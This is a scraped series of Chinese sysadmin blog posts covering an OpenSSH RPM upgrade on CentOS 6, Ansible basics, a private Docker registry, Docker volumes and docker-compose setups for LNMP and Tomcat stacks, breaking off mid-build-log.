gitlab依赖openssh因卸载openssh与openssl编译安装导致各种依赖程序被破坏，虽然最后升级成功，但是wget curl 和代码库被破坏。\n下载openssh7.7p源码包 http://www.openssh.com/portable.html\n下载之后解压看readme和install\n1. Prerequisites ---------------- A C compiler. Any C89 or better compiler should work. Where supported, configure will attempt to enable the compiler's run-time integrity checking options. Some notes about specific compilers: - clang: -ftrapv and -sanitize=integer require the compiler-rt runtime (CC=clang LDFLAGS=--rtlib=compiler-rt ./configure) You will need working installations of Zlib and libcrypto (LibreSSL / OpenSSL) Zlib 1.1.4 or 1.2.1.2 or greater (earlier 1.2.x versions have problems): http://www.gzip.org/zlib/ libcrypto (LibreSSL or OpenSSL \u0026gt;= 1.0.1 \u0026lt; 1.1.0) LibreSSL http://www.libressl.org/ ; or OpenSSL http://www.openssl.org/ LibreSSL/OpenSSL should be compiled as a position-independent library (i.e. with -fPIC) otherwise OpenSSH will not be able to link with it. If you must use a non-position-independent libcrypto, then you may need to configure OpenSSH --without-pie. Note that because of API changes, OpenSSL 1.1.x is not currently supported. The remaining items are optional. 官方给出的文档中提到的先决条件openssh安装依赖 zlib1.1.4 并且 openssl\u0026gt;=1.0.1 版本就可以了。那么直接看当前系统的openssl版本是多少\n$ openssl version OpenSSL 1.0.1e-fips 11 Feb 2013 $ rpm -q zlib zlib-1.2.3-29.el6.x86_64 $ rpm -q zlib-devel zlib-devel-1.2.3-29.el6.x86_64 发现自带的openssl版本符合openssh7.7p的安装条件，自带的zlib也符合OpenSSH7.7P的依赖。那么就直接安装吧。\n打包OpenSSH mkdir -p /usr/src/redhat/{SOURCES,SPECS} cd /usr/src/redhat/SOURCES/ wget http://ftp.riken.jp/Linux/momonga/6/Everything/SOURCES/x11-ssh-askpass-1.2.4.1.tar.gz tar xf openssh-7.7p1.tar.gz cp openssh-7.7p1/contrib/redhat/openssh.spec /usr/src/redhat/SPECS/ chown sshd:sshd /usr/src/redhat/SPECS/ -R sed -i 's@%define no_gnome_askpass 0@%define no_gnome_askpass 1@g' /usr/src/redhat/SPECS/openssh.spec sed -i 's@%define no_x11_askpass 0@%define no_x11_askpass 1@g' /usr/src/redhat/SPECS/openssh.spec cp /usr/src/redhat/SOURCES/openssh-7.7p1.tar.gz ~/rpmbuild/SOURCES/ cd /usr/src/redhat/SPECS/ rpmbuild -ba openssh.spec 可以看到rpm包和yum安装的是一样的。\n├── RPMS │ └── x86_64 │ ├── openssh-7.7p1-1.el6.x86_64.rpm │ ├── openssh-clients-7.7p1-1.el6.x86_64.rpm │ ├── openssh-debuginfo-7.7p1-1.el6.x86_64.rpm │ └── openssh-server-7.7p1-1.el6.x86_64.rpm $ rpm -qa|grep openssh openssh-clients-5.3p1-117.el6.x86_64 openssh-5.3p1-117.el6.x86_64 openssh-server-5.3p1-117.el6.x86_64 直接替换安装rpm包\n$ rpm -Uvh * Preparing... ########################################### [100%] 1:openssh ########################################### [ 25%] 2:openssh-clients ########################################### [ 50%] 3:openssh-server warning: /etc/ssh/sshd_config created as /etc/ssh/sshd_config.rpmnew ########################################### [ 75%] 4:openssh-debuginfo ########################################### [100%] 安装后查看各项依赖openssl的匀使用正常。这么安装比编译安装要好很多。\n$ sshd -V unknown option -- V OpenSSH_7.7p1, OpenSSL 1.0.1e-fips 11 Feb 2013 usage: sshd [-46DdeiqTt] [-C connection_spec] [-c host_cert_file] [-E log_file] [-f config_file] [-g login_grace_time] [-h host_key_file] [-o option] [-p port] [-u len] $ ssh -V OpenSSH_7.7p1, OpenSSL 1.0.1e-fips 11 Feb 2013 $ curl baidu.com -I HTTP/1.1 200 OK Date: Wed, 25 Apr 2018 16:37:49 GMT Server: Apache Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT ETag: \u0026quot;51-47cf7e6ee8400\u0026quot; Accept-Ranges: bytes Content-Length: 81 Cache-Control: max-age=86400 Expires: Thu, 26 Apr 2018 16:37:49 GMT Connection: Keep-Alive Content-Type: text/html $ wget -q baidu.com $ yum list \u0026gt;\u0026gt;/dev/null 测试yum安装，依赖openssh的是否会将7.7p替换为5.3p\n$ yum install openssh* Loaded plugins: fastestmirror, security Setting up Install Process Examining openssh-7.7p1-1.el6.x86_64.rpm: openssh-7.7p1-1.el6.x86_64 openssh-7.7p1-1.el6.x86_64.rpm: does not update installed package. Examining openssh-clients-7.7p1-1.el6.x86_64.rpm: openssh-clients-7.7p1-1.el6.x86_64 openssh-clients-7.7p1-1.el6.x86_64.rpm: does not update installed package. Examining openssh-debuginfo-7.7p1-1.el6.x86_64.rpm: openssh-debuginfo-7.7p1-1.el6.x86_64 openssh-debuginfo-7.7p1-1.el6.x86_64.rpm: does not update installed package. Examining openssh-server-7.7p1-1.el6.x86_64.rpm: openssh-server-7.7p1-1.el6.x86_64 openssh-server-7.7p1-1.el6.x86_64.rpm: does not update installed package. Error: Nothing to do ","permalink":"https://www.oomkill.com/2018/07/update-openssh-in-centos6/","summary":"","title":"CentOS 6.8升级OpenSSH7.7p"},{"content":"运维工具 OS Provisioning: PXE, Cobbler(repository,distritution, profile)\nPXE: dhcp, tftp, (http, ftp)\ndnsusq: dhcp, dns\nOS Config:\npuppet, saltstack, func\nTask Excute:\nfabric, func, saltstack\nDeployment:\nfabric\n管理主机，要想管理被管理节点，二者必须有安全管理通道。puppet、saltstack在管理被管节点时，每一个被管节点必须运行puppet agent，管理端进程与每一个被管节点的agent进程进行通信，通信时使用的HTTP协议。此种方式必须在被管节点安装应用程序的agent，远程接收到指令，并在本地负责执行相应的任务。\n根据远程管理时，是不是在每一个被管主机上安装agent端，分为两种puppet、func、saltstack；与无需agent端，ansible、fabric。依赖被管节点的ssh服务。而管理端需要知道对方主机上的账号密码。\nansible的组成 ansible核心 host invenory ：为了管控每个被管主机，每个主机在本地需要注册。用来定义由ansible远程配置管理的主机，每个主机的IP地址、掩码、SSH监听的地址、端口号、账号密码等。\ncore modules：ansible执行任何特定管理任务，都是不由ansible自身玩成的，而是通过模块完成的。\ncustom Modules：使用任何编程语言来编写模块。\nplaybooks：将主机要完成的多个任务，事先定义在文件中可以多次调用。\n1 ansible的特性 基于Python语言实现，由Paramiko, PyYAML和jiniia2三个关键模块 部署简单，agentless 默认使用SSH协议 主从模式： master:ansible, ssh client slave: ssh server 支持自定文模块：支持各种编程语言，支持Playbook，基于“模块”完成各种“任务”。 安装依赖于epel源\n配置文件：\n/etc/ansible/ansible.cfg\rInvertory:/etc/ansible/hosts\r2 ansible命令应用基础 语法: ansible \u0026lt;host-pattern\u0026gt; [-f forks] [-m module_name] [-a args]\n参数 说明 -f forks 启助的并发线程数。 -m module_name 要使用的模块。 -a args 模块特有的参数 查看模块 ansible-doc -l\rcommand Executes a command on a remote node composer Dependency Manager for PHP consul Add, modify \u0026amp; delete services within a consul cluster. consul_acl Manipulate Consul ACL keys and rules consul_kv Manipulate entries in the key/value store of a consul cluster. consul_session manipulate consul sessions copy Copies files to remote locations $ ansible-doc -s command\r- name: Executes a command on a remote node\rcommand:\rchdir:# Change into this directory before running the command.\rcreates: A filename or (since 2.0) glob pattern, when it already exists, this step will *not* be run.\r2.1 常见模块 command：命令模块，默认模块，用于在远程执行命令。\n$ ansible 10.0.0.12 -m command -a 'date'\r10.0.0.12 | SUCCESS | rc=0 \u0026gt;\u0026gt;\rWed May 2 14:40:57 CST 2018\r$ ansible 10.0.0.12 -a 'date'\r10.0.0.12 | SUCCESS | rc=0 \u0026gt;\u0026gt;\rWed May 2 14:41:03 CST 2018\rcron\nstate：表示任务是添加还是移除。present表示必须提供的，absent表示必须不能提供的 present：安装、absent移除。可以不写，默认都是。state默认 present\nansible websrvs cron -a 'minute=\u0026quot;*/10\u0026quot; job=\u0026quot;/bin/echo hellow' name-\u0026quot;test cron job\u0026quot;'\ruser：指明创建用户的名字\nansible all -m user -a 'name=user1'\ransible all -m group -a 'name=mysql gid=2000 system=yes'\ransible all -m user -a 'user=mysql group=mysql system=yes uid=3306'\rcopy\nsrc本地原路径，可以使用相对和绝对路径 dest远程目标路径，必须使用绝对路径\nansible all -m copy -a 'src=/etc/hosts dest=/tmp/h.ansible' owner='root' mode='644'\rcontent：取代src，表示直接用此处指定的信息生成为目标文件内容\nansible all -m copy -a 'content=\u0026quot;test ansible\u0026quot; dest=/tmp/h.ansible' $ ll /tmp/\rtotal 56\r-rw-r--r--. 1 root root 12 May 2 14:50 h.ansible\rfile\n设置文件属性，path指定文件路径，可以用name或dest替代。\n创建文件的符号链接\nansible all -m file -a 'path=/tmp/h src=/tmp/h.ansible state=link'\r$ ll /tmp/\rlrwxrwxrwx 1 root root 14 May 2 23:08 h -\u0026gt; /tmp/h.ansible\r-rw-r--r-- 1 root root 12 May 2 23:05 h.ansible\ransible all -m file -a 'name=/tmp/h.123 src=/tmp/h.ansible state=link'\r$ ll /tmp/\rtotal 56\rlrwxrwxrwx. 1 root root 14 May 2 14:53 h -\u0026gt; /tmp/h.ansible\rlrwxrwxrwx. 1 root root 14 May 2 15:00 h.123 -\u0026gt; /tmp/h.ansible\r删除文件夹\nansible all -m file -a 'path=/tmp/ state=absent'\r创建文件夹\nansible all -m file -a 'path=/tmp/test-create state=directory'\rstate=file如果文件不存在，将失败，请使用copy或templates创建\nansible-doc -s file\r修改文件权限\nansible test -m file -a 'owner=mysql group=mysql mode=000 path=/tmp/tomcat.xml'\rservice 指定运行状态\nenabled：是否开机自动启动，取值为true或false name：服务名称 state：状态，取位有started stopped restarted shell：在远程主机上运行命令。\nscript：将本地脚本复制到远程主机并运行\nyum 安装程序包\nname：指明要安装的程序包，可以带上版本号 state：present，latest安装 absent卸载 ansible test -m yum -a 'name=zsh state=present'\r","permalink":"https://www.oomkill.com/2018/06/ansible/","summary":"","title":"ansible介绍"},{"content":"docker registry介绍 Registry用于保存docker镜像，包括镜像的层次结构和元数据，用户可自建Registry，也可使用官方的Docker Hub\n分类\nSponsor Registry：第三方的registry，供客户和Docker社区使用 Mirror Registry：第三方的registry，只让客户使用 Vendor Registry：由发布Docker镜像的供应商提供的registry Private Registry：通过设有防火墙和额外的安全层的私有实体提供的registry 一个docker Registry上拥有两种功能：\n提供镜像存储的仓库。 提供用户获取镜像时的认证功能。 同时提供当前服务器上所有可用镜像的搜索索引。 一个docker镜像仓库有仓库的名称，等同于yum的repostory。通常简称为repo。为了使的镜像和应用程序版本之间有意义上的关联关系。在docker一个仓库通常只存放一个应用程序的镜像。因此，这个仓库名就是应用程序名。通过给每个镜像额外添加一个组件叫tag，来标识每一个镜像。通常镜像名称:标签repo_name:tag才能唯一标识一个镜像。\n为了可以快速创建registry，docker专门提供了一个程序包 docker-distribution 。https://hub.docker.com/r/distribution/registry/ regustry自身运行在容器中，而容器的文件系统会随着容器生命周期终止而删除，因此需要给registry定义存储卷，使用网络存储。\n在yum的extras仓库有一个docker-registry的程序包。docker-distribution的主配置文件在 /etc/docker-distribution/registry/config.yml，所有上传的镜像存放在/var/lib/registry 。\n$ yum info docker-registry\rAvailable Packages\rName : docker-registry\rArch : x86_64\rVersion : 0.9.1\rRelease : 7.el7\rSize : 123 k\rRepo : extras/7/x86_64\rSummary : Registry server for Docker\rURL : https://github.com/docker/docker-registry\rLicense : ASL 2.0\rDescription : Registry server for Docker (hosting/delivering of repositories and images).\r配置docker registry访问 非 docker hub 必须给定registry的地址端口，如果不是顶层仓库还要给定用户名。 docker push 默认基于https工作的，而服务器端使用的http，两者不兼容，需要标记为非加密、非安全的docker registry。\n$ docker push node02.com:5000/php\rThe push refers to repository [node02.com:5000/php]\rGet https://node02.com:5000/v2/: http: server gave HTTP response to HTTPS client\r编辑 /etc/docker/daemon.json 添加 insecure-registries ，并且名称一定要与仓库引用时使用的名称完全保持一致，多个以逗号分隔\n{\r\u0026quot;insecure-registries\u0026quot;: [\u0026quot;node02.com:5000\u0026quot;]\r}\rpush的镜像存放在 /var/lib/registry/ 下，V2指的是registry的协议版本\n$ ll /var/lib/registry/docker/registry/v2/\rtotal 0\rdrwxr-xr-x 3 root root 20 Aug 28 23:31 blobs\rdrwxr-xr-x 3 root root 17 Aug 28 23:31 repositories\rpush时镜像会分层次，每一层都单独推送，单独存放。产生的镜像层次存放在 php/_layers/sha256/ ，真正存放的路径为 /var/lib/registry/docker/registry/v2/blobs 下\n$ ll /var/lib/registry/docker/registry/v2/repositories/php/_layers/sha256/\rtotal 0\r13bb1aa790b2a283bdeb26a9dd4afa0891e37252dd6f836e2bc8e1555903f7fd\r256b176beaff7815db2a93ee2071621ae88f451bb1e198ca73010ed5bba79b65\r3584183957db768fc11554dfd6b06ec41be02d7872cecb65aa5ba9f238c897e6\r499f1709b835427d28bc4ddb1e7038a438f1a1272abfe5489d6c74cb69b51bec\r6d33f059b806836d7e63f6f26f154b99a42abcc1d384da7569de593b8135f7fb\r8158b516b87541f3641937087e8048977f48f9ced0bfaeb0bc007c1ea0d49b93\r8fa12d754b796a48f42433fae8a8eee24b56679bba4e5648fa50b184622dd941\rca82288118de1328f65d428e6d2acc6a87ecf552ed5cc3698fde90cf76f3ebdb\rd393fc3ffa9b40bfbddd978604e0d5249b0bb1a6e4953142d8b2c80fcc85bcb4\rd9f1ee7bf8cab99a7362c98708edd26c2f622f13b8c74c3cafd6197442c20609\r通过api获取中镜像与标签\n$ curl http://192.168.50.27:5000/v2/game/tags/list\r{\u0026quot;name\u0026quot;:\u0026quot;game\u0026quot;,\u0026quot;tags\u0026quot;:[\u0026quot;0123-151422\u0026quot;,\u0026quot;0124-162847\u0026quot;,\u0026quot;0124-164112\u0026quot;,\u0026quot;0125\u0026quot;]}\r查看仓库中内容\n$ curl -XGET http://192.168.50.27:5000/v2/_catalog\r{\u0026quot;repositories\u0026quot;:[\u0026quot;apiv1\u0026quot;,\u0026quot;game\u0026quot;,\u0026quot;php\u0026quot;,\u0026quot;tyapi\u0026quot;]}\r","permalink":"https://www.oomkill.com/2018/06/docker-registry/","summary":"","title":"docker Registry使用"},{"content":"对于docker来讲，作为容器运行的底层引擎，在组织及运行容器时每个容器内只运行一个程序及子程序。对于这个容器来讲，启动时依赖于 底层镜像联合挂载启动而成。 底层能够存储此类分层构建并联合挂载镜像的文件系统。最上层构建读写层。对于此读写层来说。所有对容器的操作都保存在最上层之上。而下层内容的操作需要使用写时复制。\nDocker镜像由多个只读层叠加而成，启动容器时，Docker会加载只读镜像层并在镜像栈顶部添加一个读写层，如果运行中的容器修改了现有的一个已经存在的文件，那该文件将会从读写层下面的只读层复制到读写层，该文件的只读版本仍然存在，只是已经被读写层中该文件的副本所隐藏，此即 写时复制（COW）机制。此机制对IO较高的应用在实现持久化存储时，势必对在底层应用数据存储时性能要求较高。要想绕过使用限制，可以使用存储卷机制。\nWhy Data Volume？\n宿主机的主机文件系统直接与容器内部的文件系统之上的某一访问路径建立绑定关系。\n在宿主机上目录和容器内文件系统建立绑定关系的目录相对于容器来讲被称为volume。容器内所有有效数据都是保存在存储卷，从而脱离容器自身文件系统。当容器关闭并删除时，只要不删除与宿主机与之绑定的存储目录，就能实现数据脱离容器的生命周期而持久化。docker的存储卷默认情况下使用其所在宿主机之上的本地文件系统目录的。\n关闭并重启容器，其数据不受影响；但删除Docker容器，则其更改将会全部丢失 存在的问题 存储于联合文件系统中，不易于宿主机访问； 容器间数据共享不便 删除容器其数据会丢失 解决方案：“卷（volume）” “卷”是容器上的一个或多个“目录”，此类目录可绕过联合文件系统，与宿主机上的某目录“绑定（关联）” 在docker中如果需要动刀存储卷时，不必要手动创建，Volume于容器初始化之时即会创建，由base image提供的卷中的数据会于此期间完成复制\nVolume的初衷是独立于容器的生命周期实现数据持久化，因此删除容器之时既不会删除卷，也不会对哪怕未被引用的卷做垃圾回收操作；\nData volumes ·卷为docker提供了独立于容器的数据管理机制 ·可以把“镜像”想像成静态文件，例如“程序”，把卷类比为动态内容，例如“数据 \u0026ldquo;；于是，镜像可以重用，而卷可以共享； ·卷实现了“程序（镜像）”和“数据（卷）”分离，以及“程序（镜像）”和“制作镜像的主机 \u0026ldquo;分离，用户制作镜像时无须再考虑镜像运行的容器所在的主机的环境；\nDocker有两种类型的卷，每种类型都在容器中存在一个挂载点，但其在宿主机上的位置有所不同；\nBind mount volume 绑定挂载卷 在宿主机指定一个特定路径，在容器内指定一个特定路径，二者已知路径建立关联关系。\na volume that points to a user-specified location on the host file system\nDocker-managed volume docker管理卷 指定容器内的挂载点，与之关联的是宿主机的目录由docker daemon引擎自行创建空目录，或者使用已存在目录与存储卷路径建立关联关系。\nthe Docker daemon creates managed volumes in a portion of the host\u0026rsquo;s file system that\u0026rsquo;s owned by Docker\n在容器中使用Volumes 为docker run命令使用一v选项即可使用Volume\nDocker-managed volume\ndocker run-it-name box1 -v /data busybox\rdocker inspect-f {{.Mounts} box1\r查看bbox1容器的卷、卷标识符及挂载的主机目录 Bind-mount Volume\ndocker run-it-v HOSTDIR:VOLUMEDIR--name box2 busybox\rdocker inspect-f {{.Mounts}} box2\rSharing volumes There are two ways to share volumes between containers 多个容器的卷使用同一个主机目录，例如\n$ docker run-it--namec1-v/docker/volumes/v1：/data busybox\r$ docker run-it--name c2-v/docker/volumes/v1：/data busybox\r复制使用其它容器的卷，为docker run命令使用\u0026ndash;volumes-from选项\ndocker run-it--name box1 -v /docker/volumes/v1:/data busybox\rdocker run-it--name box2 --volumes-from box1 busybox\rEXPOSE 用于为容器打开指定要监听的端口以实现与外部通信，并不会直接暴露，只是声明需要暴露的端口，在docker run -P时自动暴露端口\nSyntax\nEXPOSE \u0026lt;port\u0026gt; [/\u0026lt;protocol\u0026gt;] [\u0026lt;port\u0026gt;[/\u0026lt;protocol\u0026gt;]..]\r用于指定传输层协议，可为wp或udp二者之一，默认为TCP协议 EXPOSE指令可一次指定多个端口，例如\nEXPOSE 11211/udp 11211/tcp\rENV 用于为镜像定义所需的环境变量，并可被Dockerfile文件中位于其后的其它指令（如ENV、ADD、COPY等）所调用\n调用格式为Svariable_name或${variable_name}\nSyntax ENV \u0026lt;key\u0026gt; \u0026lt;value\u0026gt;或 ENV \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; .… 第一种格式中，之后的所有内容均会被视作其 \u0026lt;value\u0026gt; 的组成部分，因此，一次只能设置一个变量；\n第二种格式可用一次设置多个变量，每个变量为一个 \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; 的键值对，如果 \u0026lt;value\u0026gt; 中包含空格，可以以反斜线（）进行转义，也可通过对 \u0026lt;value\u0026gt; 加引号进行标识；另外，反斜线也可用于续行；\n定义多个变量时，建议使用第二种方式，以便在同一层中完成所有功能\n","permalink":"https://www.oomkill.com/2018/06/docker-volume/","summary":"","title":"docker Volume"},{"content":"Compose是一个定义和管理多容器的工具，使用Python语言编写。使用Compose配置文件描述多个容器应用的架构，比如使用 什么镜像、数据卷、网络、映射端口等；然后一条命令管理所有服务，比如启动、停止、重启等。\n1、Linux安装Compose 参考网址：Releases · docker/compose · GitHub\n下载二进制文件 curl -L \\\rhttps://github.com/docker/compose/releases/download/1.22.0/docker-compose-\\\r`uname -s`-`uname -m` -o /usr/local/bin/docker-compose\r对二进制文件添加可执行权限 chmod +x /usr/local/bin/docker-compose\r测试安装 docker-compose \u0026ndash;version\n也可以使用pip工具安装：pip install docker-compose\n2、使用compose 参考文档：Docker Compose | Docker Documentation\ncompose语法详解：Compose file version 3 reference | Docker Documentation Docker compose file 中文参考文档 - CSDN博客\n2.1 Compose常用命令选项 参数 介绍 build 构建或修改Dockerfile后重建服务 config 验证和查看compose文件语法\n-q,只验证配置，不输出。 当配置正确时，不输出任何内容，当文件配置错误，输出错误信息。\n--services,打印服务名，一行一个 create down 停止和删除容器、网络、卷、镜像，这些内容是通过docker-compose up命令创建的. 默认值删除 容器 网络。 logs 打印compose service日志输出。 ps 打印compose进程，-q只打印pid 更多参数参考：Docker-compose命令详解 - CSDN博客\n2.2 compose创建tomcat环境 Dockerfile\nFROM centos\rMAINTAINER lc\rADD jdk-8u144-linux-x64.tar.gz /usr/local\rENV JAVA_HOME=/usr/local/jdk1.8.0_144\rADD apache-tomcat-8.5.32.tar.gz /usr/local/\rRUN mv /usr/local/apache-tomcat-8.5.32 /usr/local/tomcat\rWORKDIR /usr/local/tomcat\rENTRYPOINT [\u0026quot;bin/catalina.sh\u0026quot;,\u0026quot;run\u0026quot;]\rEXPOSE 8080\rcompose\nversion: \u0026quot;3\u0026quot;\rservices: web:\rbuild:\rcontext: .\rdockerfile: \u0026quot;javafile\u0026quot;\rports:\r- \u0026quot;80:8080\u0026quot;\rimage: \u0026quot;tomcat\u0026quot;\rcontainer_name: \u0026quot;tomcat\u0026quot;\r验证是否\n$ docker-compose ps\rName Command State Ports ------------------------------------------------------------------\rroot_web_1 bin/catalina.sh run Up 0.0.0.0:32768-\u0026gt;8080/tcp\r$ 2.3 docker compose语法描述 关键词 解释 version compose版本 ","permalink":"https://www.oomkill.com/2018/06/docker-compose/","summary":"","title":"docker-compose使用"},{"content":"使用docker-compose构建LNMP环境。 编写Dockerfile 这里采用的是先将nginx php打包为rpm包，然后做成镜像。与直接在容器里编译安装同理的。\nnginx Dockerfile\nFROM centos\rMAINTAINER lc\rRUN yum install -y gcc gcc-c++ openssl-devel make pcre-devel\rADD nginx-1.13.9-1.el7.centos.x86_64.rpm /tmp/\rRUN cd /tmp/ \u0026amp;\u0026amp; rpm -ivh nginx-1.13.9-1.el7.centos.x86_64.rpm\rADD nginx.conf /etc/nginx/\rEXPOSE 80\rCMD [\u0026quot;/usr/sbin/nginx\u0026quot;, \u0026quot;-g\u0026quot;, \u0026quot;daemon off;\u0026quot;]\rphp Dockerfile\nFROM centos\rMAINTAINER LC\rRUN curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo\rRUN curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo\rRUN yum install zlib-devel \\\rlibxml2-devel \\\rlibjpeg-devel \\\rlibjpeg-turbo-devel \\\rfreetype-devel \\\rlibpng-devel gd-devel \\\rcurl-devel \\\rlibxslt-devel \\\rbzip2-devel \\\rgmp-devel \\\rreadline-devel \\\rmcrypt \\\rmhash \\\ropenssl-devel \\\rlibmcrypt-devel -y\rCOPY php-7.1.17-1.el7.centos.x86_64.rpm /tmp/\rCOPY libiconv-1.15-1.el7.centos.x86_64.rpm /tmp/\rRUN rpm -ivh /tmp/libiconv-1.15-1.el7.centos.x86_64.rpm\rRUN rpm -ivh /tmp/php-7.1.17-1.el7.centos.x86_64.rpm\rADD php-fpm.conf /etc/php/\rCMD /usr/sbin/php-fpm \u0026amp;\u0026amp; tail -f /dev/null\rEXPOSE 9000\r准备构建容器的配置文件 在nginx配置文件中增加解析php的语句\nlocation ~ .*\\.(php|php5)$ {\rfastcgi_pass php.com:9000;$\u0026lt;--这里使用link将php的ip解析过来\rfastcgi_index index.php;\rinclude fastcgi.conf;\r}\r修改php-fpm监听端口为外网通讯的ip\n$ sed -i \u0026quot;s#listen = 127.0.0.1:900$listen = 0.0.0.0:900$g\u0026quot; php/php-fpm.conf $ cat php/php-fpm.conf |grep 9000\rlisten = 0.0.0.0:9000\r注：此步骤可以在打包RPM时，使用%post在安装后进行修改，免去构建镜像的步骤\n准备RPM包 $ ls -1 php\rlibiconv-1.15-1.el7.centos.x86_64.rpm\rphp-7.1.17-1.el7.centos.x86_64.rpm\rphpfile\rphp-fpm.conf\rphp.ini\r$ ls -1 nginx\rnginx-1.13.9-1.el7.centos.x86_64.rpm\rnginx.conf\rnginxfile\r使用docker-compose一键构建镜像 编写docker-compose.yaml version: \u0026quot;3\u0026quot;\rservices:\rnginx:\rhostname: nginx\rbuild:\rcontext: ./nginx\rdockerfile: nginxfile\rexpose:\r- \u0026quot;80\u0026quot;\rports:\r- \u0026quot;80:80\u0026quot;\rlinks:\r- mysql\r- php:php.com\rvolumes:\r- ./wwwroot:/usr/share/nginx/html/\rphp:\rhostname: \u0026quot;php\u0026quot;\rbuild:\rcontext: ./php\rdockerfile: phpfile\rports: - \u0026quot;9000:9000\u0026quot;\rlinks:\r- mysql:mysql-db\rvolumes:\r- ./wwwroot:/usr/share/nginx/html/\rmysql:\rimage: mysql:5.6\rhostname: mysql\rports:\r- \u0026quot;3306:3306\u0026quot;\renvironment:\rMYSQL_ROOT_PASSWORD: \u0026quot;Zhang@123\u0026quot;\rMYSQL_USER: \u0026quot;test\u0026quot;\rMYSQL_PASSWORD: \u0026quot;test@123\u0026quot;\r参考文档： https://hub.docker.com/_/mysql/\n检查docker-compose-yaml语法 $ docker-compose config\rservices:\rmysql:\renvironment:\rMYSQL_PASSWORD: test@123\rMYSQL_ROOT_PASSWORD: Zhang@123\rMYSQL_USER: test\rhostname: mysql\rimage: mysql:5.6\rports:\r......\r注：在语法正确时，打印docker-compose.yaml内容，语法出错直接报问题所在位置。\n一键构建所有镜像 $ docker-compose build\rmysql uses an image, skipping\rBuilding php\rStep 1/12 : FROM centos\r---\u0026gt; 5182e96772bf\r.....\rStep 12/12 : EXPOSE 9000\r---\u0026gt; Running in 3c5f3c46124c\rRemoving intermediate container 3c5f3c46124c\r---\u0026gt; 8791ad17224d\rSuccessfully built 8791ad17224d\rSuccessfully tagged lnmp_php:latest\rBuilding nginx\rStep : FROM centos\r---\u0026gt; 5182e96772bf\r.....\rStep 8/8 : CMD [\u0026quot;/usr/sbin/nginx\u0026quot;, \u0026quot;-g\u0026quot;, \u0026quot;daemon off;\u0026quot;]\r---\u0026gt; Using cache\r---\u0026gt; 8cca531a5c21\rSuccessfully built 8cca531a5c21\rSuccessfully tagged lnmp_nginx:latest\r管理编排容器 docker-compose up -d\rdocker-compose down\rdocker-compose ps 查看运行结果\n使用docker-compose一键构建tomcat集群 编写Dockerfile nginx Dockerfile FROM centos\rMAINTAINER lc\rRUN yum install -y gcc gcc-c++ openssl-devel make pcre-devel\rADD nginx-1.13.9-1.el7.centos.x86_64.rpm /tmp/\rRUN cd /tmp/ \u0026amp;\u0026amp; rpm -ivh nginx-1.13.9-1.el7.centos.x86_64.rpm\rADD nginx.conf /etc/nginx/\rEXPOSE 80\rCMD [\u0026quot;/usr/sbin/nginx\u0026quot;, \u0026quot;-g\u0026quot;, \u0026quot;daemon off;\u0026quot;]\rtomcat Dockerfile FROM centos\rMAINTAINER lc\rADD apache-tomcat-8.5.29.tar.gz /usr/share/\rADD jdk-8u161-linux-x64.tar.gz /usr/share/\rRUN mv /usr/share/apache-tomcat-8.5.29 /usr/share/tomcat\rENV JAVA_HOME=/usr/share/jdk1.8.0_161\rWORKDIR /usr/share/tomcat\rENTRYPOINT [\u0026quot;bin/catalina.sh\u0026quot;,\u0026quot;run\u0026quot;]\rEXPOSE 8080\r准备配置文件 upstream tomcat {\rserver tomcat01:8080;\rserver tomcat02:8080;\r}\rserver {\rlisten 81;\rlocation / {\rproxy_pass http://tomcat/;\rproxy_set_header Host $host;\rclient_max_body_size 10m;\rproxy_set_header X-Real-IP $remote_addr;\rproxy_set_header REMOTE-HOST $remote_addr;\rproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\r}\r}\r# 在日志中加入如下配置，来证明访问是负载进行的。\rlog_format access '\u0026quot;$upstream_addr\u0026quot; $remote_addr - $remote_user [$time_local] \u0026quot;$request\u0026quot; '\r'$status $body_bytes_sent \u0026quot;$http_referer\u0026quot; '\r'\u0026quot;$http_user_agent\u0026quot; \u0026quot;$http_x_forwarded_for\u0026quot;';\raccess_log /data/nginx/log/access.log access;\rmkdir ./webapps/ROOT\recho jsp-test \u0026gt;webapps/ROOT/index.jsp\r准备构建容器所需的软件 apache-tomcat-8.5.29.tar.gz\rjdk-8u144-linux-x64.tar.gz\rtomcatfile\r编写docker-compose文件 version: \u0026quot;3\u0026quot;\rservices:\rnginx:\rhostname: nginx\rbuild:\rcontext: ./nginx\rdockerfile: nginxfile\rports:\r- 80:81\rlinks:\r- tomcat01:tomcat01\r- tomcat02:tomcat02\rvolumes:\r- ./webapps:/usr/share/nginx/html\rdepends_on:\r- mysql\r- tomcat01\r- tomcat02\rtomcat01:\rhostname: tomcat01\rbuild:\rcontext: ./tomcat\rdockerfile: tomcatfile\rlinks:\r- mysql:mysql-db\rvolumes:\r- ./webapps:/usr/share/tomcat/webapps/\rtomcat02:\rhostname: tomcat02\rbuild: context: ./tomcat\rdockerfile: tomcatfile\rlinks: - mysql:mysql-db\rvolumes:\r- ./webapps:/usr/share/tomcat/webapps/\rmysql:\rhostname: mysql\rimage: mysql:5.5\rports: - 3306:3306\renvironment: MYSQL_ROOT_PASSWORD: 123456\rMYSQL_DATABASE: wordpress\rMYSQL_USER: user\rMYSQL_PASSWORD: 123456\r使用docker-compose一键构建镜像 $ docker-compose -f docker-compose.yml build mysql uses an image, skipping\rBuilding tomcat02\rStep : FROM centos\r---\u0026gt; 5182e96772bf\rStep 2/9 : MAINTAINER lc\r---\u0026gt; Using cache\r---\u0026gt; 111890e6d42e\rStep 3/9 : ADD apache-tomcat-8.5.29.tar.gz /usr/share/\r---\u0026gt; 46725ed86e2e\rStep 4/9 : ADD jdk-8u144-linux-x64.tar.gz /usr/share/\r---\u0026gt; 431ea9bb9918\rStep 5/9 : RUN mv /usr/share/apache-tomcat-8.5.29 /usr/share/tomcat\r---\u0026gt; Running in 22275e028633\rRemoving intermediate container 22275e028633\r---\u0026gt; 0f3919e97b50\rStep 6/9 : ENV JAVA_HOME=/usr/share/jdk1.8.0_144\r---\u0026gt; Running in 60d616e0b9fc\rRemoving intermediate container 60d616e0b9fc\r---\u0026gt; 5255488c51ab\rStep 7/9 : WORKDIR /usr/share/tomcat\r---\u0026gt; Running in 6b04d8f5524b\rRemoving intermediate container 6b04d8f5524b\r---\u0026gt; db88a81ec00a\rStep 8/9 : ENTRYPOINT 